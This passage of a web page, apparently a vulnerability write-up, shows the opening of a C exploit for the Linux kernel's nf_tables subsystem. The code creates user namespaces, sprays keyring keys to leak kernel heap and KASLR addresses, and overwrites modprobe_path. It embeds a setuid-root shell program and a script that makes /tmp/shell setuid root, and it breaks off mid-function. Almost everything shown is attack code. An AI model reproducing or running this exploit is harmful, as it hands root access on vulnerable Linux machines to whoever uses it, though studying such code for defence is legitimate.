class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -o exp -l mnl -l nftnl -w</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libmnl/libmnl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/chain.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/expr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/rule.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/table.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libnftnl/set.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nf_tables.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter/nfnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ethtool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/io_uring.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MQUEUE_NUM 5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INBOUND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OUTBOUND 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC_MAX 0x800</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAMELEN 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR_PREFIX <span class="meta-string">&quot;err: &quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEY_DESC_MAX_SIZE 40</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREFIX_BUF_LEN 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RCU_HEAD_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_KEY_SIZE 50</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYSMAP_MASK 0xffffffff00000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_SIZE 1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NB_ENTRIES 10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> base_base;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_base;</span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_addr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_trans_phase</span> &#123;</span></span><br><span class="line">        NFT_TRANS_PREPARE,</span><br><span class="line">        NFT_TRANS_ABORT,</span><br><span class="line">        NFT_TRANS_COMMIT,</span><br><span class="line">        NFT_TRANS_RELEASE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ll_next;</span><br><span class="line">    <span class="keyword">void</span> *ll_prev;</span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;</span><br><span class="line">    <span class="keyword">void</span> *next;</span><br><span class="line">    <span class="keyword">void</span> *security;</span><br><span class="line">&#125;msg_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[BUFFER];</span><br><span class="line">&#125; Msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> iface[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> ip[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">char</span> netmask[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> idx;</span><br><span class="line">    <span class="keyword">uint8_t</span> type;</span><br><span class="line">    <span class="keyword">uint16_t</span> proto;</span><br><span class="line">    <span class="keyword">uint16_t</span> port;</span><br><span class="line">    <span class="keyword">uint8_t</span> action;</span><br><span class="line">    <span class="keyword">char</span> desc[DESC_MAX];</span><br><span class="line">&#125; <span class="keyword">user_rule_t</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">keyring_payload</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> prefix[PREFIX_BUF_LEN];</span><br><span class="line">    <span class="keyword">uint8_t</span> rcu_buf[RCU_HEAD_LEN];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">leak</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> kaslr_base;</span><br><span class="line">    <span class="keyword">long</span> physmap_base;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd_uring</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> *<span class="title">params</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span> <span class="keyword">key_serial_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> priv_file[] = <span class="string">&quot;/tmp/shell.c\0&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> dummy_file[] = <span class="string">&quot;/tmp/dummy\0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> priv_context[] = <span class="string">&quot;#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(int argc, char **argv)&#123;if (geteuid() == 0)&#123;setuid(0);setgid(0);puts(\&quot;[+] I am root\&quot;);system(\&quot;bash\&quot;);&#125;&#125;\x00&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> dummy_content[] = <span class="string">&quot;\xff\xff\xff\xff&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> new_modprobe_content[] = <span class="string">&quot;#!/bin/bash\n\nchown root:root /tmp/shell\nchmod 4555 /tmp/shell\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">key_serial_t</span> <span class="title">add_key</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *type, <span class="keyword">const</span> <span class="keyword">char</span> *description, <span class="keyword">const</span> <span class="keyword">void</span> *payload, <span class="keyword">size_t</span> plen, <span class="keyword">key_serial_t</span> ringid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, type, description, payload, plen, ringid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">long</span> <span class="title">keyctl</span><span class="params">(<span class="keyword">int</span> operation, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bye</span><span class="params">(<span class="keyword">char</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_error_exit</span><span class="params">(<span class="keyword">char</span> *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bye2</span><span class="params">(<span class="keyword">char</span> *info, <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(info, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring</span><span class="params">(<span class="keyword">uint32_t</span> start, <span class="keyword">uint32_t</span> spray_size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_buffer == <span class="literal">NULL</span>)</span><br><span class="line">        bye(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = start; i &lt; start+spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, KEY_DESC_MAX_SIZE, <span class="string">&quot;SPRAY-RING-%03du&quot;</span>, i);</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, key_desc, key_desc, <span class="built_in">strlen</span>(key_desc), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring_list_del_purpose</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> prev, <span class="keyword">uint64_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// next[0x8] = prev, prev[0x0] = next allocation occured at gather mqueue</span></span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x0</span>, &amp;next, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x8</span>, &amp;prev, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x10</span>, <span class="string">&quot;12341234&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x18</span>, &amp;size, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_buffer == <span class="literal">NULL</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, temp, temp, <span class="number">0x20</span>, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring_list_overwrite_purpose</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, <span class="keyword">uint64_t</span> len, <span class="keyword">uint64_t</span> off_18, </span></span></span><br><span class="line"><span class="params"><span class="function">                                                    <span class="keyword">uint64_t</span> off_20, <span class="keyword">uint64_t</span> off_28, <span class="keyword">uint64_t</span> off_30, <span class="keyword">uint64_t</span> off_38)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">switch</span>((len<span class="number">-1</span>)/<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x0</span>, &amp;off_18, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x8</span>, &amp;off_20, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x10</span>, &amp;off_28, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x18</span>, &amp;off_30, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x20</span>, &amp;off_38, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            bye(<span class="string">&quot;add_key - assert(len &lt;= 0x28)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, KEY_DESC_MAX_SIZE, temp);</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, temp, temp, len, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_keyring_leak</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[USHRT_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        keylen = keyctl(KEYCTL_READ, id_buffer[i], (<span class="keyword">long</span>)buffer, <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (keylen &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;buffer[<span class="number">6</span>],<span class="string">&quot;\xff\xff&quot;</span>, <span class="number">2</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            heap_base = *((<span class="keyword">uint64_t</span>*)buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] leak successed, kmalloc-64 heap: 0x%llx\n&quot;</span>, heap_base);</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] leak failed, idkval: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> id_buffer_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">awake_partial_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[USHRT_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line">    keylen = keyctl(KEYCTL_UPDATE, id_buffer[idx], (<span class="keyword">long</span>)buffer, <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;keyctl(KEYCTL_REVOKE)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(id_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_partial_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">int</span> i)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;keyctl(KEYCTL_REVOKE)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_stable_table_and_set</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">char</span> * set_name = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a table for the sets to be associated with</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> * <span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_stable</span> =</span>  nftnl_set_alloc();</span><br><span class="line">    set_name = <span class="string">&quot;set_stable&quot;</span>;</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    